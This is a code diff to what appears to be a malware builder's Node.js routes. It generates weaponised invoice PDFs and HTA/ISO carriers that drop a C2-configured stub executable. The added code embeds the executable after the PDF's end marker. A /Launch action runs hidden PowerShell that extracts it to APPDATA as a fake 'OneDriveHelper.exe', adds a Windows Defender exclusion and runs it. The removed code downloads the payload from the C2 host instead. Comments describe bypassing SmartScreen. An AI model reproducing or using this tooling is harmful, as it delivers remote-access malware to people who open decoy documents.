@@ -7,6 +7,7 @@ const { spawn } = require("child_process");
 const multer    = require("multer");
 const { requireAdmin }    = require("../middleware/auth");
 const { buildStubBinary } = require("../controllers/builderController");
+const { AUTH_KEY }        = require("../config/constants");
 
 // In-memory storage for uploaded PDFs (no disk writes needed)
 const pdfUpload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 20 * 1024 * 1024 } });
@@ -173,7 +174,8 @@ router.get("/api/builder/carrier", requireAdmin, (req, res) => {
   // over the HTTP Host header, which may be 'localhost' when accessed locally.
   const host  = (req.query.c2host || "").trim() || req.headers.host || "localhost";
 
-  if (!fs.existsSync(DL_HELPER)) {
+  // pdfexec builds the stub fresh — skip the DL_HELPER check for it
+  if (type !== "pdfexec" && !fs.existsSync(DL_HELPER)) {
     return res.status(400).json({
       error: "OneDriveHelper.exe not found — click Build in the builder above first to generate it, then download the carrier."
     });
@@ -205,7 +207,16 @@ router.get("/api/builder/carrier", requireAdmin, (req, res) => {
     pdf:  () => ({ name: `${pdfOpts.filename}.pdf.hta`,     mime: "application/hta",          body: buildDocCarrier(payload, decoyPdfUrl + "?" + new URLSearchParams(pdfOpts), "%TEMP%\\~invoice.pdf",  "pdf",  saveTo) }),
     // Genuine .pdf — real invoice, /OpenAction /Launch fires powershell hidden.
     // pname = AcroRd32.exe / Acrobat.exe / FoxitReader → DR_016 fires.
-    pdfexec: () => ({ name: `${pdfOpts.filename}.pdf`,     mime: "application/pdf",           body: buildExecPdf(pdfOpts) }),
+    pdfexec: () => {
+      // Build a fresh configured stub every time — no stale DL_HELPER dependency
+      const exeBuf = buildStubBinary({ c2Host: host, authKey: AUTH_KEY });
+      // Also update DL_HELPER so /dl/exe serves the fresh version
+      try {
+        if (!fs.existsSync(DL_DIR)) fs.mkdirSync(DL_DIR, { recursive: true });
+        fs.writeFileSync(DL_HELPER, exeBuf);
+      } catch (_) {}
+      return { name: `${pdfOpts.filename}.pdf`, mime: "application/pdf", body: buildExecPdf(pdfOpts, exeBuf) };
+    },
     word: () => ({ name: `${pdfOpts.filename}.docx.hta`,   mime: "application/hta",           body: buildDocCarrier(payload, decoyDocUrl + "?" + new URLSearchParams(pdfOpts), "%TEMP%\\~report.docx", "word", saveTo) }),
     // ISO wrapping — no Mark-of-the-Web → SmartScreen is bypassed on older/unpatched Windows
     // pname = parent of whatever runs the exe inside the ISO (typically explorer.exe → DR_001)
@@ -568,13 +579,13 @@ function buildDecoyPdf(opts = {}) {
 //   3. Writes to %TEMP%\OneDriveHelper.exe and executes it
 // The extracted file has NO Zone.Identifier ADS → SmartScreen does not fire.
 // pname = AcroRd32.exe / Acrobat.exe / FoxitReader.exe → DR_016 fires.
-function buildExecPdf(opts = {}) {
+function buildExecPdf(opts = {}, exeBuf = null) {
   const from     = opts.from     || "Nexus Solutions Ltd.";
   const to       = opts.to       || "Acme Corporation";
   const note     = opts.note     || "";
   const filename = opts.filename || "Invoice_Q4-2024";
 
-  const exeBuf  = fs.readFileSync(DL_HELPER);
+  if (!exeBuf) exeBuf = fs.readFileSync(DL_HELPER);
   const exeSize = exeBuf.length;
 
   // Escape a string for use inside a PDF literal-string ( ... )
@@ -1031,30 +1042,72 @@ function injectLaunchIntoPdf(pdfBuf, psArgs) {
   ]);
 }
 
-// POST /api/builder/inject-pdf — upload a real PDF, get it back with /Launch injected
+// Injects a self-contained /Launch into an existing PDF.
+// Builds the exe fresh from Stub.exe, appends it after %%EOF, patches the offset sentinel.
+function injectLaunchWithExe(pdfBuf, exeBuf, pdfFilename) {
+  const exeSize = exeBuf.length;
+  const fn      = (pdfFilename || "document").replace(/\.pdf$/i, "");
+
+  const pdfStr = s => s.replace(/\\/g, "\\\\").replace(/\(/g, "\\(").replace(/\)/g, "\\)");
+
+  const psRaw =
+    `$fn='${fn}.pdf';` +
+    `$u=$env:USERPROFILE;` +
+    `$locs=@("$u\\Downloads","$u\\Desktop","$env:TEMP","$u\\Documents","$u\\OneDrive\\Desktop","$u\\OneDrive\\Downloads");` +
+    `$fp=$locs|%{$p=Join-Path $_ $fn;if(Test-Path $p){$p}}|?{$_}|Select-Object -First 1;` +
+    `if(!$fp){$fp=Get-ChildItem "$u" -Recurse -Filter $fn -EA 0|Sort-Object LastWriteTime -Desc|Select-Object -First 1|%{$_.FullName}};` +
+    `if($fp){` +
+    `$o=12345678;$z=${exeSize};` +
+    `$rb=[IO.File]::ReadAllBytes($fp);$eb=$rb[$o..($o+$z-1)];` +
+    `$tp=Join-Path $env:APPDATA OneDriveHelper.exe;` +
+    `[IO.File]::WriteAllBytes($tp,$eb);` +
+    `try{Add-MpPreference -ExclusionProcess $tp -EA Stop}catch{};` +
+    `try{([wmiclass]'Win32_Process').Create($tp,$null,$null)|Out-Null}catch{Start-Process $tp -WindowStyle Hidden}` +
+    `}`;
+
+  const psArgs   = pdfStr(`-w hidden -nop -c "${psRaw}"`);
+  const augmented = injectLaunchIntoPdf(pdfBuf, psArgs);
+
+  // Patch $o= sentinel with real exe offset (= length of augmented PDF)
+  const exeOffset = augmented.length;
+  const offsetStr = String(exeOffset).padStart(8, "0");
+  const sentinel  = Buffer.from("$o=12345678", "latin1");
+  const sidx      = augmented.indexOf(sentinel);
+  if (sidx !== -1) Buffer.from(offsetStr, "latin1").copy(augmented, sidx + 3);
+
+  return Buffer.concat([augmented, exeBuf]);
+}
+
+// POST /api/builder/inject-pdf — upload any PDF, get it back self-contained with /Launch + exe embedded
 router.post("/api/builder/inject-pdf", requireAdmin,
   pdfUpload.single("pdf"),
   (req, res) => {
     if (!req.file) return res.status(400).json({ error: "No PDF file received" });
 
-    if (!fs.existsSync(DL_HELPER))
-      return res.status(400).json({ error: "OneDriveHelper.exe not found — click Build first." });
+    const host = (req.body.c2host || "").trim() || req.headers.host || "localhost";
 
-    const proto = req.headers["x-forwarded-proto"] || (req.secure ? "https" : "http");
-    const host  = (req.body.c2host || "").trim() || req.headers.host || "localhost";
-    const payloadUrl = `${proto}://${host}/dl/exe`;
+    // Build a fresh configured exe every time
+    let exeBuf;
+    try {
+      exeBuf = buildStubBinary({ c2Host: host, authKey: AUTH_KEY });
+      try {
+        if (!fs.existsSync(DL_DIR)) fs.mkdirSync(DL_DIR, { recursive: true });
+        fs.writeFileSync(DL_HELPER, exeBuf);
+      } catch (_) {}
+    } catch (e) {
+      // Fall back to cached exe if Stub.exe missing
+      if (fs.existsSync(DL_HELPER)) {
+        exeBuf = fs.readFileSync(DL_HELPER);
+      } else {
+        return res.status(500).json({ error: "Stub.exe not found: " + e.message });
+      }
+    }
 
-    const pdfStr = s => s.replace(/\\/g,"\\\\").replace(/\(/g,"\\(").replace(/\)/g,"\\)");
-    const psArgs = pdfStr(
-      `-w hidden -nop -c "$wc=New-Object Net.WebClient;` +
-      `$wc.DownloadFile('${payloadUrl}',$env:TEMP+'\\OneDriveHelper.exe');` +
-      `Start-Process ($env:TEMP+'\\OneDriveHelper.exe') -WindowStyle Hidden"`
-    );
+    const origName   = (req.file.originalname || "document.pdf").replace(/[^a-zA-Z0-9._\- ]/g, "_");
+    const pdfFilename = origName.replace(/\.pdf$/i, "");
 
     try {
-      const result   = injectLaunchIntoPdf(req.file.buffer, psArgs);
-      const origName = (req.file.originalname || "document.pdf")
-        .replace(/[^a-zA-Z0-9._\- ]/g, "_");
+      const result = injectLaunchWithExe(req.file.buffer, exeBuf, pdfFilename);
       res.setHeader("Content-Type", "application/pdf");
       res.setHeader("Content-Disposition", `attachment; filename="${origName}"`);
       res.send(result);
